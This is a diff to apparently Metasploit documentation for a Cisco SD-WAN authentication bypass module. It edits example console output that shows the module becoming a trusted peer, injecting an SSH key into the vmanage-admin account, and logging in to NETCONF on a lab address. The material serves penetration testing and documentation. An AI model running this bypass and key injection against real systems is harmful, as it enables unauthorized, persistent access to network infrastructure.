@@ -94,11 +94,11 @@ msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) > run
 [*] Hello response received - we are now a trusted peer
 [*] Phase 5: SSH key injection into vmanage-admin authorized_keys
 [*] Generating RSA 2048-bit SSH keypair
-[*] SSH private key saved to: /tmp/sdwan_ssh_key_192.168.86.166_12346_1774009551
-[*] SSH public key saved to: /tmp/sdwan_ssh_key_192.168.86.166_12346_1774009551.pub
-[*] SSH private key saved to loot: /home/sfewer/.msf4/loot/20260320122551_default_192.168.86.166_cisco.sdwan.sshk_431386.pem
-[+] Use: ssh -i /tmp/sdwan_ssh_key_192.168.86.166_12346_1774009551 vmanage-admin@192.168.86.166 -p 830
-[*] Server responded with: REGISTER_TO_VMANAGE
+[*] SSH private key saved to loot: /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
+[+] Connect to NETCONF via:
+chmod 600 /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
+ssh -i /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem vmanage-admin@192.168.86.166 -p 830
+[*] Server responded with: REGISTER_TO_VMANAGE (key has been injected)
 [+] Authentication bypass and SSH key injection completed!
 [*] Auxiliary module execution completed
 msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) >
@@ -108,7 +108,8 @@ msf auxiliary(admin/networking/cisco_sdwan_auth_bypass) >
 Now we can use the generated SSH key to access the NETCONF service:
 
 ```console
-sfewer@sfewer-ubuntu-vm:~$ ssh -i /tmp/sdwan_ssh_key_192.168.86.166_12346_1774009551 vmanage-admin@192.168.86.166 -p 830
+sfewer@sfewer-ubuntu-vm:~$ chmod 600 /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem
+sfewer@sfewer-ubuntu-vm:~$ ssh -i /home/sfewer/.msf4/loot/20260326150429_default_192.168.86.166_cisco.sdwan.sshk_366073.pem vmanage-admin@192.168.86.166 -p 830
 viptela 20.15.3 
 
 <?xml version="1.0" encoding="UTF-8"?>
